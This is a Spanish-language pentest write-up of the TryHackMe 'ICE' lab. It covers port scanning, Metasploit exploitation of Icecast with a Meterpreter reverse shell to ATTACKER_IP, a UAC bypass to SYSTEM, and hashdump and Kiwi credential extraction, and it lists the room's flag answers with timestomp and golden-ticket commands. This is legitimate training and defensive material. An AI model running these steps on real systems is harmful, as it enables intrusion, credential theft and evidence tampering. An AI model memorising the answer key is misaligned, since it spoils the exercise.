## INDICE
- [1. Portada]
- [2. Resumen Ejecutivo]
- [3. Alcance]
- [4. Metodología]
- [5. Evidencias]
  - [Evidencia 1 – Reconocimiento de puertos](#evidencia-1--reconocimiento-de-puertos-con-script-personalizado)
  - [Evidencia 2 – Fingerprinting de servicios](#evidencia-2--fingerprinting-de-servicios-y-scripts-nse--sv--sc)
  - [Evidencia 3 – Reporte HTML de nmap](#evidencia-3--reporte-html-de-nmap-servicios-y-so)
  - [Evidencia 4 – Enum web puerto 5357](#evidencia-4--enumeración-web-en-puerto-5357-whatweb--gobuster)
  - [Evidencia 5 – Escaneo de vulnerabilidades](#evidencia-5--escaneo-de-vulnerabilidades-con-script-personalizado-droidsh)
  - [Evidencia 6 – Slowloris](#evidencia-6--nmap-html-vulnerabilidad-slowloris-http-slowloris-check)
  - [Evidencia 7 – MS17-010](#evidencia-7--nmap-html-vulnerabilidad-smb-ms17-010-smb-vuln-ms17-010)
  - [Evidencia 8 – Icecast en 8000](#evidencia-8--identificación-de-servicio-icecast-en-puerto-8000)
  - [Evidencia 9 – Módulo metasploit icecast](#evidencia-9--búsqueda-de-exploit-icecast-en-metasploit)
  - [Evidencia 10 – OSINT icecast CVE-2004-1561](#evidencia-10--investigación-osint-sobre-icecast-y-cve-2004-1561)
  - [Evidencia 11 – Selección de exploit icecast_header](#evidencia-11--selección-del-exploit-windowsthhttpicecast_header)
  - [Evidencia 12 – Explotación y sesión meterpreter](#evidencia-12--configuración-y-explotación-de-icecast-acceso-inicial)
  - [Evidencia 13 – informacion de sistema](#evidencia-13--enumeración-básica-desde-meterpreter)
  - [Evidencia 14 – Local exploit suggester](#evidencia-14--uso-de-local_exploit_suggester-para-privesc)
  - [Evidencia 15 – BypassUAC EventVWR](#evidencia-15--exploit-bypassuac_eventvwr)
  - [Evidencia 16 – Migración a spoolsv-y-system](#evidencia-16--migración-a-proceso-spoolsvexe-y-obtención-de-system)
  - [Evidencia 17 – Hashdump, Kiwi-mimikatz creds_all](#evidencia-17--dump-de-hashes-con-hashdump-carga-de-kiwi-y-extracción-de-credenciales-con-creds_all)
- [6. Tabla de comandos]
- [7. MITRE ATT&CK]
- [8. Banderas]
- [9. Conclusiones]
- [10. Recomendaciones]
- [11. Deslinde de responsabilidad]

---

## 1. Portada

- **Título:** ICE — Análisis Profesional de Vulnerabilidades y Explotación  
- **Autor:** Mtro. Mitchell Correa – Junior Pentester 
- **Fecha:** 20/FEB/2026
- **Plataforma:** TryHackMe (THM)  
- **Confidencialidad:** RESTRINGIDO / EDUCATIVO  

---

## 2. Resumen Ejecutivo

## Resumen Ejecutivo
Se realizó una prueba de intrusión controlada contra la máquina **ICE** en la plataforma THM, exponiendo un escenario típico de servidor **Windows 7 Professional SP1** con múltiples servicios de red habilitados (SMB, RDP, HTTP y streaming). Mediante escaneos automatizados con Nmap y scripts personalizados se identificaron puertos críticos abiertos y versiones específicas de servicios.

Los análisis de vulnerabilidades mostraron que el sistema era susceptible a fallos graves como **MS17-010 (SMBv1 – Remote Code Execution)** y la vulnerabilidad Slowloris en servicios HTTP, además de un servidor de streaming **Icecast** con un fallo histórico de ejecución remota de código **(CVE-2004-1561)**.

Utilizando el framework de explotación **Metasploit**, se explotó el servicio Icecast para obtener una sesión Meterpreter remota, que permitió acceder al sistema con permisos de usuario. Posteriormente, a través de módulos de escalación local **(bypass de UAC y exploits sugeridos)**, se consiguió elevar privilegios hasta **NT AUTHORITY\SYSTEM**, el nivel más alto en Windows.

Desde esta posición se extrajeron hashes de contraseñas y credenciales en memoria (incluyendo usuario **“Dark”**), demostrando la viabilidad de movimientos laterales y compromiso de otras máquinas en un entorno real.

A nivel ejecutivo, el ejercicio muestra que un servidor legacy, sin parches críticos y expuesto con servicios innecesarios, puede ser comprometido completamente con herramientas públicas, permitiendo robo de credenciales, pérdida de disponibilidad y riesgo de propagación de malware o ransomware.

El flujo de ataque fue:

1. Escaneo y enumeración de servicios.  
2. Identificación de Icecast vulnerable.  
3. Explotación con Metasploit (`icecast_header`) para obtener sesión **Meterpreter**.  
4. Escalación de privilegios a **NT AUTHORITY\SYSTEM** usando `local_exploit_suggester` y `bypassuac_eventvwr`.  
5. Dump de hashes (`hashdump`) y extracción de credenciales en memoria (`kiwi` / `creds_all`).

Este laboratorio muestra un compromiso **end-to-end**, desde el servicio expuesto hasta la exfiltración de credenciales.

---

## 3. Alcance

- **Host objetivo:** `IP_TARGET` (1 host IPv4) — máquina ICE (THM).  
- **Sistema operativo:** Windows 7 Professional SP1 x64.  
- **Servicios relevantes:** 135/tcp, 139/tcp, 445/tcp, 3389/tcp, 5357/tcp, 8000/tcp y 49152–49160/tcp.  
- **Herramientas empleadas:**  
  - Nmap + NSE  
  - WhatWeb  
  - Gobuster  
  - Script `droid.sh`  
  - Metasploit Framework  
  - Kiwi/Mimikatz  
  - Navegador web (OSINT)  

---

## 4. Metodología

- **Reconocimiento:** escaneo completo de puertos TCP con Nmap (`-sS -p-`).  
- **Análisis de vulnerabilidades:** ejecución de scripts NSE (vía wrapper `droid.sh`) y revisión de resultados.  
- **Explotación: módulo Metasploit 'windows/http/icecast_header'
- **Escalación de privilegios:** `local_exploit_suggester` + `bypassuac_eventvwr` + migración de proceso.  
- **Banderas (si aplica):** No aplica (reporte profesional).  
- **Herramientas usadas:** Nmap, NSE, WhatWeb, Gobuster, `droid.sh`, Metasploit/Meterpreter, Kiwi.  
- **Consolidación:** conclusiones y recomendaciones priorizadas basadas en las evidencias listadas.

---

## 5. Evidencias

### Evidencia #1 — Reconocimiento de puertos (Nmap TCP SYN)

1. **Comando:** `nmap -n -Pn -T4 -sS --open -p- --min-rate 4000 IP_TARGET`  
2. **Objetivo:** identificar rápidamente puertos TCP expuestos para orientar enumeración y pruebas posteriores.  
3. **Qué hizo (técnico):** ejecutó un escaneo SYN a todos los puertos TCP, omitiendo DNS (`-n`) y host discovery (`-Pn`), priorizando velocidad (`--min-rate 4000`).  
4. **Resultado obtenido:** puertos 135, 139, 445, 3389, 5357, 8000 y 49152–49160/tcp reportados como abiertos.  
5. **Persona común:** es como recorrer todas las puertas/ventanas para ver cuáles están abiertas.  
6. **Captura:** Evidencia_1

---

### Evidencia #2 — Fingerprinting de servicios y scripts por defecto (Nmap -sV -sC)

1. **Comando:**  
   ```bash
   nmap -n -Pn -sV -sC --vv --min-rate 3000      -p135,139,445,3389,5357,8000,49152-49160      -oA ICE/nmap/IP_TARGET_version_scan IP_TARGET
   ```  
2. **Objetivo:** identificar servicios/versiones y recolectar información inicial mediante scripts por defecto.  
3. **Qué hizo (técnico):** enumeró versiones (`-sV`) y ejecutó scripts por defecto (`-sC`) en puertos específicos, generando salidas múltiples (`-oA`).  
4. **Resultado obtenido:** detección de servicios y del sistema operativo como Windows 7 Professional SP1.  
5. **Persona común:** es como preguntar “¿quién eres y qué haces?” a cada servicio visible.  
6. **Captura:** Evidencia_2

---

### Evidencia #3 — Reporte HTML de Nmap (servicios y SO)

1. **Comando:** `-oA ICE/nmap/IP_TARGET_version_scan` (generación de reporte)  
2. **Objetivo:** consolidar en un reporte legible los puertos/servicios detectados para análisis y trazabilidad.  
3. **Qué hizo (técnico):** creó artefactos de salida (Nmap/XML/HTML) para revisión posterior.  
4. **Resultado obtenido:** el reporte muestra puertos 135, 139, 445, 3389, 5357 y 8000, incluyendo detección de Windows 7 Professional SP1.  
5. **Persona común:** es como imprimir un reporte de inspección para consultarlo después.  
6. **Captura:** Evidencia_3

---

### Evidencia #4 — Enumeración web en 5357 (WhatWeb + Gobuster)

1. **Comando:**  
   ```bash
   whatweb http://IP_TARGET:5357/
   gobuster dir -u http://IP_TARGET:5357/      -w /usr/share/wordlists/dirb/common.txt      -x .php,.zip -s 200,204,301,302,307,403      -b -t 200 -k --no-error      -o ICE/otros/enum_1_gobuster.txt
   ```  
2. **Objetivo:** validar comportamiento del servicio HTTP y descubrir rutas/recursos potenciales.  
3. **Qué hizo (técnico):** identificó tecnologías web con WhatWeb y realizó enumeración de rutas con Gobuster usando wordlist `common.txt`.  
4. **Resultado obtenido:** se reporta “503 Service Unavailable” en 5357 y se ejecuta fuerza bruta de rutas (resultado detallado no provisto).  
5. **Persona común:** es como revisar un directorio de oficinas y tocar puertas para ver cuáles responden.  
6. **Captura:**Evidencia_4

---

### Evidencia #5 — Escaneo de vulnerabilidades con wrapper `droid.sh` (NSE)

1. **Comando:** `sudo ./droid.sh`  
2. **Objetivo:** automatizar la ejecución de scripts NSE orientados a vulnerabilidades sobre el objetivo.  
3. **Qué hizo (técnico):** ejecutó múltiples scripts NSE (ej. `http-slowloris-check`, `smb-vuln-ms17-010`) contra `IP_TARGET`.  
4. **Resultado obtenido:** se generaron hallazgos posteriores de Slowloris y MS17-010 (ver Evidencias #6 y #7).  
5. **Persona común:** es como pasar una lista de verificación rápida de fallas conocidas.  
6. **Captura:** Evidencia_5

---

### Evidencia #6 — Indicador de Slowloris (http-slowloris-check)

 
1. **Objetivo:** identificar exposición a ataques de denegación de servicio tipo Slowloris en HTTP.  
2. **Qué hizo (técnico):** utilizó el script NSE `http-slowloris-check` para evaluar susceptibilidad.  
3. **Resultado obtenido:** el reporte HTML indica “LIKELY VULNERABLE” a Slowloris, referenciando **CVE-2007-6750**.  
4. **Persona común:** es como detectar si una línea telefónica puede ser bloqueada manteniendo llamadas incompletas.  
5. **Captura:** Evidencia_6

---

### Evidencia #7 — Indicador de MS17-010 en SMB (smb-vuln-ms17-010)

 
1. **Objetivo:** comprobar si SMB expone la vulnerabilidad MS17-010 (riesgo de ejecución remota).  
2. **Qué hizo (técnico):** descubrimiento de vulnerabilidad `smb-vuln-ms17-010` contra 445/tcp.  
3. **Resultado obtenido:** el reporte indica que SMBv1 en 445/tcp es vulnerable a **MS17-010** (y menciona **CVE-2017-0143**), habilitando RCE.  
4. **Persona común:** es como descubrir una cerradura conocida por abrirse con una herramienta pública.  
5. **Captura:** Evidencia_7

---

### Evidencia #8 — Identificación de Icecast en 8000/tcp


1. **Objetivo:** confirmar el servicio expuesto en 8000/tcp y su naturaleza (HTTP/streaming).  
. **Qué hizo (técnico):** interpretó la salida del reporte HTML de Nmap para 8000/tcp.  
3. **Resultado obtenido:** `8000/tcp open http` y servicio “Icecast streaming media server”; método soportado: GET.  
4. **Persona común:** es como identificar el tipo de negocio detrás de una puerta por su letrero.  
5. **Captura:** Evidencia_8

---

### Evidencia #9 — Búsqueda de exploit Icecast en Metasploit

1. **Comando:**  
   ```bash
   msfconsole -q
   search icecast
   ```  
2. **Objetivo:** localizar módulos disponibles para explotación del servicio Icecast identificado.  
3. **Qué hizo (técnico):** consultó la base de módulos de Metasploit por coincidencias con “icecast”.  
4. **Resultado obtenido:** aparece `exploit/windows/http/icecast_header` con “Rank: great”.  
5. **Persona común:** es como buscar en un catálogo una herramienta específica para una cerradura conocida.  
6. **Captura:** Evidencia_9

---

### Evidencia #10 — OSINT sobre Icecast y CVE-2004-1561

1. **Acción:** búsqueda web descrita como “icecast 2004-09-28”.  
2. **Objetivo:** validar públicamente la existencia/naturaleza de una vulnerabilidad asociada a Icecast.  
3. **Qué hizo (técnico):** investigó documentación pública del CVE y su vector (overflow por cabeceras HTTP) para contextualizar el exploit.  
4. **Resultado obtenido:** se describe **CVE-2004-1561** como overflow en Icecast 2.0.1 que permitiría RCE mediante cabeceras HTTP maliciosas.  
5. **Persona común:** es como consultar un boletín de fallas conocidas del fabricante.  
6. **Captura:** Evidencia_10

---

### Evidencia #11 — Selección del exploit `windows/http/icecast_header`

1. **Comando:**  
   ```bash
   msfconsole -q
   search icecast
   use 0
   show options
   ```  
2. **Objetivo:** cargar el módulo correcto y revisar parámetros necesarios antes de explotar.  
3. **Qué hizo (técnico):** seleccionó el módulo y revisó opciones; se menciona uso de payload `windows/meterpreter/reverse_tcp`.  
4. **Resultado obtenido:** módulo `exploit/windows/http/icecast_header` cargado y listo para configurar.  
5. **Persona común:** es como preparar una herramienta y revisar qué llaves/ajustes necesita.  
6. **Captura:** Evidencia_11.

---

### Evidencia #12 — Explotación de Icecast y sesión Meterpreter (acceso inicial)

1. **Comando:**  
   ```bash
   set LHOST ATTACKER_IP
   set RHOST IP_TARGET
   set RPORT 8000
   exploit
   ```  
2. **Objetivo:** obtener acceso inicial remoto a través del servicio Icecast expuesto.  
3. **Qué hizo (técnico):** configuró IP/puerto local y remoto y ejecutó el exploit para abrir una sesión reverse Meterpreter.  
4. **Resultado obtenido:** se obtiene `meterpreter session 1` contra el host “Dark-PC”.  
5. **Persona común:** es como lograr que el sistema “te llame de vuelta” y te abra una línea de control.  
6. **Captura:** Evidencia_12.

---

### Evidencia #13 — Enumeración básica desde Meterpreter

1. **Comando:**  
   ```text
   getuid
   ps
   sysinfo
   ```  
2. **Objetivo:** identificar el contexto de ejecución (usuario, procesos, sistema) para planear escalación.  
3. **Qué hizo (técnico):** consultó el usuario efectivo, lista de procesos y datos del sistema desde la sesión.  
4. **Resultado obtenido:** usuario `Dark-PC\Dark`; Windows 7 SP1 x64; dominio `WORKGROUP`.  
5. **Persona común:** es como revisar “quién soy y dónde estoy parado” dentro del sistema.  
6. **Captura:** Evidencia_13 & 13_1.

---

### Evidencia #14 — Sugerencias de privesc con `local_exploit_suggester`

1. **Comando:**  
   ```bash
   search local_exploit_suggester
   use 0
   sessions -l
   set SESSION 1
   run
   ```  
2. **Objetivo:** identificar opciones de escalación local potencialmente aplicables al sistema comprometido.  
3. **Qué hizo (técnico):** ejecutó el módulo que analiza la sesión y sugiere exploits locales compatibles.  
4. **Resultado obtenido:** se sugieren múltiples módulos (p. ej. `bypassuac_comhijack`, `bypassuac_eventvwr`, `ms10_092_schelevator`, etc.) como potencialmente válidos.  
5. **Persona común:** es como pedirle a un asistente que sugiera llaves que podrían abrir una puerta interior.  
6. **Captura:** Evidencia_14.

---

### Evidencia #15 — Bypass de UAC con `bypassuac_eventvwr`

1. **Comando:**  
   ```bash
   use exploit/windows/local/bypassuac_eventvwr
   show options
   set SESSION 1
   set LPORT 4455
   set LHOST ATTACKER_IP
   exploit
   ```  
2. **Objetivo:** elevar privilegios aprovechando bypass de UAC desde la sesión existente.  
3. **Qué hizo (técnico):** configuró el exploit local con una sesión existente y ejecutó el bypass para abrir una nueva sesión elevada.  
4. **Resultado obtenido:** se obtiene una nueva sesión Meterpreter con privilegios elevados.  
5. **Persona común:** es como saltarse un aviso de “¿estás seguro?” para acceder a funciones de administrador.  
6. **Captura:** Evidencia_15.

---

### Evidencia #16 — Migración a `spoolsv.exe` y obtención de SYSTEM

1. **Comando:**  
   ```text
   getuid
   ps
   migrate 1400
   getuid
   ```  
2. **Objetivo:** estabilizar la sesión en un proceso privilegiado y confirmar escalación total (SYSTEM).  
3. **Qué hizo (técnico):** migró la sesión al PID 1400 (`spoolsv.exe`) y verificó el usuario efectivo.  
4. **Resultado obtenido:** `getuid` devuelve `NT AUTHORITY\SYSTEM` tras la migración.  
5. **Persona común:** es como cambiar a una sala de control con acceso total.  
6. **Captura:** Evidencia_16.

---

### Evidencia #17 — Extracción de hashes con `hashdump`

1. **Comando:** `hashdump`  
2. **Objetivo:** demostrar exposición de credenciales locales mediante extracción de hashes LM/NTLM.  
3. **Qué hizo (técnico):** volcó hashes de cuentas locales desde el sistema comprometido.  
4. **Resultado obtenido:** se extraen hashes LM/NTLM de cuentas locales (Administrator, Dark, Guest, etc.) (según el texto provisto; valores no provistos).  
5. **Persona común:** es como copiar “huellas” de contraseñas que podrían romperse offline.  
6. **Captura:** Evidencia_17.

---

### Evidencia #18 — Carga de Kiwi y extracción con `creds_all`

1. **Comando:**  
   ```text
   load kiwi
   creds_all
   ```  
2. **Objetivo:** evidenciar riesgo de exposición de credenciales en memoria (incl. texto claro/hashes).  
3. **Qué hizo (técnico):** cargó la extensión Kiwi (funcionalidades tipo Mimikatz) y solicitó credenciales disponibles.  
4. **Resultado obtenido:** recuperación de credenciales desde memoria (MSV, WDigest, tspkg, Kerberos), incluyendo contraseñas en texto claro y hashes (según el texto provisto; detalles no provistos).  
5. **Persona común:** es como encontrar un “llavero” con accesos guardados dentro del sistema.  
6. **Captura:** Evidencia_17.

---

## 6. Tabla de comandos

| Comando | Uso | Ejemplo/Output | Evidencia |
|---|---|---|---|
| `nmap -n -Pn -T4 -sS --open -p- --min-rate 4000 IP_TARGET` | Descubrimiento rápido de puertos abiertos (SYN scan). | Puertos abiertos: 135,139,445,3389,5357,8000,49152–49160/tcp (según texto). | #1 |
| `nmap -n -Pn -sV -sC --vv --min-rate 3000 -p135,139,445,3389,5357,8000,49152-49160 -oA ICE/nmap/IP_TARGET_version_scan IP_TARGET` | Enumeración de servicios/versiones y scripts por defecto + reporte. | Detección de Windows 7 Professional SP1 (según texto). | #2 |
| `whatweb http://IP_TARGET:5357/` | Fingerprinting de tecnologías web. | No provisto. | #4 |
| `gobuster dir -u http://IP_TARGET:5357/ ... -o ICE/otros/enum_1_gobuster.txt` | Enumeración de directorios/archivos web. | 503 Service Unavailable (según texto); resto No provisto. | #4 |
| `sudo ./droid.sh` | Wrapper para NSE orientado a vulnerabilidades. | No provisto (hallazgos referenciados en #6 y #7). | #5 |
| `msfconsole -q` | Iniciar Metasploit (modo silencioso). | No provisto. | #9 |
| `search icecast` | Localizar exploit para Icecast en Metasploit. | Módulo `exploit/windows/http/icecast_header` (según texto). | #9 |
| `set LHOST ATTACKER_IP` / `set RHOST IP_TARGET` / `set RPORT 8000` / `exploit` | Configurar y lanzar exploit remoto `icecast_header`. | Sesión `meterpreter session 1` (según texto). | #12 |
| `getuid` / `ps` / `sysinfo` | Enumeración básica desde Meterpreter. | Usuario `Dark-PC\Dark`, Windows 7 SP1 x64, WORKGROUP (según texto). | #13 |
| `search local_exploit_suggester` / `use 0` / `set SESSION 1` / `run` | Sugerir exploits locales para privesc. | Lista de módulos sugeridos (según texto). | #14 |
| `use exploit/windows/local/bypassuac_eventvwr` + `set SESSION 1` + `exploit` | Bypass de UAC para sesión elevada. | Nueva sesión con privilegios elevados (según texto). | #15 |
| `migrate 1400` | Migración a `spoolsv.exe` para estabilizar/elevar. | `NT AUTHORITY\SYSTEM` (según texto). | #16 |
| `hashdump` | Extracción de hashes LM/NTLM. | Hashes extraídos (valores No provistos). | #17 |
| `load kiwi` / `creds_all` | Extracción de credenciales desde memoria (Kiwi/Mimikatz). | Credenciales recuperadas (detalles No provistos). | #18 |

---

## 7. MITRE ATT&CK

| Táctica | Técnica | ID | Evidencia | Justificación breve |
|---|---|---:|---:|---|
| Reconnaissance | Active Scanning (Port Scanning) | T1595.001 | #1 | Escaneo de puertos TCP con Nmap para identificar superficie expuesta. |
| Discovery | Network Service Discovery | T1046 | #2 | Enumeración de servicios/versiones en puertos detectados. |
| Reconnaissance | Vulnerability Scanning | T1595.002 | #5 | Uso de scripts NSE orientados a vulnerabilidades (vía `droid.sh`). |
| Reconnaissance | Search Open Websites/Domains | T1593 | #10 | Investigación OSINT sobre Icecast y CVE asociado. |
| Initial Access | Exploit Public-Facing Application | T1190 | #12 | Explotación de servicio expuesto (Icecast) para acceso inicial. |
| Privilege Escalation | Exploitation for Privilege Escalation | T1068 | #14 | Uso de sugerencias y selección de exploit local para elevar privilegios. |
| Privilege Escalation | Bypass User Account Control | T1548.002 | #15 | Uso de `bypassuac_eventvwr` para elevación. |
| Defense Evasion | Process Injection / Migration | T1055 | #16 | Migración de sesión a proceso (`spoolsv.exe`) para operar con mayores privilegios. |
| Credential Access | OS Credential Dumping | T1003 | #17, #18 | Extracción de hashes (`hashdump`) y credenciales con Kiwi (`creds_all`). |

---

## 8. Banderas

| # | Pregunta (traducida al español) | Respuesta |
|---|---------------------------------|-----------|
| 1 | Una vez que el escaneo se completa, vemos varios puertos interesantes abiertos. El firewall está deshabilitado, dejando poco para proteger la máquina. Uno de los puertos interesantes es Microsoft Remote Desktop (MSRDP). ¿En qué puerto está abierto este servicio? | `3389` |
| 2 | ¿Qué servicio identificó Nmap como ejecutándose en el puerto 8000? (Primer palabra del servicio) | `Icecast` |
| 3 | ¿Qué nombre de host identifica Nmap para la máquina? (Responder en MAYÚSCULAS) | `DARK-PC` |
| 4 | Tras investigar el servicio Icecast, se observa que esta versión tiene una vulnerabilidad grave con puntuación de 7.5 (7.4 según la fuente). ¿Cuál es el **Impact Score** de esta vulnerabilidad en cvedetails.com? | `6.4` |
| 5 | ¿Cuál es el número de CVE para esta vulnerabilidad? (Formato: CVE-0000-0000) | `CVE-2004-1561` |
| 6 | Tras iniciar Metasploit, buscamos el exploit con `search icecast`. ¿Cuál es la ruta completa (empezando con `exploit`) del módulo de explotación? | `exploit/windows/http/icecast_header` |
| 7 | Después de seleccionar el módulo, ejecutamos `show options`. ¿Cuál es el único parámetro obligatorio que aparece vacío? | `RHOSTS` |
| 8 | ¡Hemos conseguido una primera intrusión en la máquina víctima! ¿Cómo se llama la shell que tenemos ahora? | `meterpreter` |
| 9 | ¿Qué usuario estaba ejecutando el proceso de Icecast? | `Dark` |
| 10 | ¿Qué compilación (build) de Windows tiene el sistema? | `7601` |
| 11 | Sabiendo más detalles del sistema, comenzamos a escalar privilegios. ¿Cuál es la arquitectura del proceso que estamos ejecutando? | `x64` |
| 12 | Al ejecutar el *local exploit suggester* obtenemos varios exploits potenciales. ¿Cuál es la ruta completa (empezando con `exploit/`) del **primer** exploit devuelto? | `exploit/windows/local/bypassuac_eventvwr` |
| 13 | Tras establecer el número de sesión, aparece otra opción que debemos configurar porque la IP del listener no es correcta. ¿Cómo se llama esta opción? | `LHOST` |
| 14 | Verificamos los privilegios con `getprivs`. ¿Qué privilegio listado nos permite tomar propiedad de archivos? | `SeTakeOwnershipPrivilege` |
| 15 | Para interactuar con `lsass` debemos “vivir dentro” de un proceso con la misma arquitectura (x64) y privilegios. El servicio de cola de impresión cumple con estos requisitos y se reinicia si se cae. ¿Cuál es el nombre de este servicio de impresión? | `spoolsv.exe` |
| 16 | Comprobamos qué usuario somos con `getuid`. ¿Qué usuario se muestra? | `NT AUTHORITY\SYSTEM` |
| 17 | ¿Qué comando nos permite recuperar todas las credenciales? | `creds_all` |
| 18 | Ejecuta el comando anterior. ¿Cuál es la contraseña del usuario `Dark`? | `Password01` |
| 19 | ¿Qué comando nos permite volcar todos los hashes de contraseña almacenados en el sistema? | `hashdump` |
| 20 | ¿Qué comando nos permite ver en tiempo real el escritorio del usuario remoto? | `screenshare` |
| 21 | ¿Qué comando usaríamos si quisiéramos grabar desde un micrófono conectado al sistema? | `record_mic` |
| 22 | Para dificultar la labor forense podemos modificar las marcas de tiempo (timestamps) de los archivos. ¿Qué comando permite hacerlo? | `timestomp` |
| 23 | Mimikatz permite crear un `golden ticket`, que nos deja autenticarnos en cualquier parte con facilidad. ¿Qué comando se usa para esto? | `golden_ticket_create` |

---

## 9. Conclusiones

- 🔥 **Compromiso remoto validado** mediante explotación de un servicio expuesto (Icecast) con sesión Meterpreter obtenida. (**Evidencia #12**)  
- 🔥 **Escalación completa a SYSTEM** confirmada tras migración a `spoolsv.exe`, habilitando control administrativo total. (**Evidencia #16**)  
- 🔥 **Exposición crítica de credenciales**: extracción de hashes y credenciales en memoria (Kiwi/Mimikatz), ampliando el riesgo de movimiento lateral. (**Evidencias #17 y #18**)  
- ⚠️ **Indicadores de debilidad adicional**: hallazgos reportados de Slowloris y MS17-010 sugieren superficie legacy con vulnerabilidades conocidas. (**Evidencias #6 y #7**)  

---

## 10. Recomendaciones

1. **Prioridad crítica:** retirar/migrar Windows 7 (fin de soporte) y aplicar parches críticos en el corto plazo si la migración no es inmediata.  
2. **Reducir superficie expuesta:** eliminar o actualizar el servicio **Icecast** y restringir su exposición (segmentación, ACLs, VPN, allowlists).  
3. **Endurecer SMB:** deshabilitar **SMBv1**, restringir 445/tcp y aplicar mitigaciones/validaciones ante **MS17-010** (según exposición observada).  
4. **Endurecer elevación y administración:** revisar políticas UAC, limitar cuentas locales con privilegios, y operar con principio de mínimo privilegio.  
5. **Proteger credenciales:** endurecer LSASS y controles de protección de credenciales; revisar configuraciones relacionadas con WDigest y almacenamiento de secretos; monitorear eventos de acceso a credenciales.  
6. **Mitigar DoS en HTTP:** implementar controles contra Slowloris (reverse proxy/WAF, límites de conexiones/timeouts) en servicios HTTP expuestos.  
7. **Gestión continua:** ejecutar escaneos y pentests recurrentes sobre sistemas legacy; formalizar un proceso de gestión de vulnerabilidades y hardening.

---

## 11. Deslinde de responsabilidad

Este material se elaboró con fines educativos y de entrenamiento en un entorno controlado. No debe utilizarse para actividades no autorizadas. El autor y este documento no promueven el uso indebido de las técnicas descritas.
